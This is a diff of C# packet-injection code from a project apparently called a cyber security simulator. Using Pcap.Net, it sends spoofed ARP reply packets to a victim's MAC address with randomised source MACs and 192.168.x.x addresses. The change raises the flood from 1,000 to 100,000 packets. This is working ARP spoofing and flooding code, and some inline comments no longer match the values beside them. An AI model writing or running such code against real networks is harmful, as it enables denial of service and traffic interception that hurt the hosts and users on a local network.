@@ -32,11 +32,9 @@ namespace PDA_Cyber_Security_Simulator_V1
             // Take the selected adapter
             PacketDevice selectedDevice = allDevices[0];
 
-            
-
             using (PacketCommunicator communicator = selectedDevice.Open(100, PacketDeviceOpenAttributes.Promiscuous, 1000))
             {
-                for (int i = 0; i != 1000; ++i)
+                for (int i = 0; i != 100000; ++i)
                 {
                     // Supposing to be on ethernet, set mac source to 01:01:01:01:01:01
                     string randMac = "4C:0C:BD:" + rand.Next(2, 9).ToString() + rand.Next(2, 9).ToString() + ":" + rand.Next(2, 9).ToString() + rand.Next(2, 9).ToString() + ":" + rand.Next(2, 9).ToString() + rand.Next(2, 9).ToString();
@@ -46,7 +44,7 @@ namespace PDA_Cyber_Security_Simulator_V1
                         new EthernetLayer
                         {
                             Source = new MacAddress(randMac),
-                            Destination = new MacAddress(victimMacAddress),
+                            Destination = new MacAddress(victimMacAddress.Replace('-', ':')),
                             EtherType = EthernetType.None, // Will be filled automatically.
                         };
 
@@ -56,10 +54,10 @@ namespace PDA_Cyber_Security_Simulator_V1
                         {
                             ProtocolType = EthernetType.IpV4,
                             Operation = ArpOperation.Reply,
-                            SenderHardwareAddress = new byte[] { 3, 3, 3, 3, 3, 3 }.AsReadOnly(), // 03:03:03:03:03:03.
-                            SenderProtocolAddress = new byte[] { 1, 2, 3, 4 }.AsReadOnly(), // 1.2.3.4.
+                            SenderHardwareAddress = new byte[] { 15, 16, 16, 3, (byte)rand.Next(1, 14), (byte)rand.Next(1, 14) }.AsReadOnly(), // 03:03:03:03:03:03.
+                            SenderProtocolAddress = new byte[] { 192, 168, 1, (byte)rand.Next(5, 180) }.AsReadOnly(), // 1.2.3.4.
                             TargetHardwareAddress = new byte[] { 4, 4, 4, 4, 4, 4 }.AsReadOnly(), // 04:04:04:04:04:04.
-                            TargetProtocolAddress = new byte[] { 11, 22, 33, 44 }.AsReadOnly(), // 11.22.33.44.
+                            TargetProtocolAddress = new byte[] { 192, 168, (byte)rand.Next(5, 180), (byte)rand.Next(5, 180) }.AsReadOnly(), // 11.22.33.44.
                         };
 
                     PacketBuilder builder = new PacketBuilder(ethernetLayer, arpLayer);
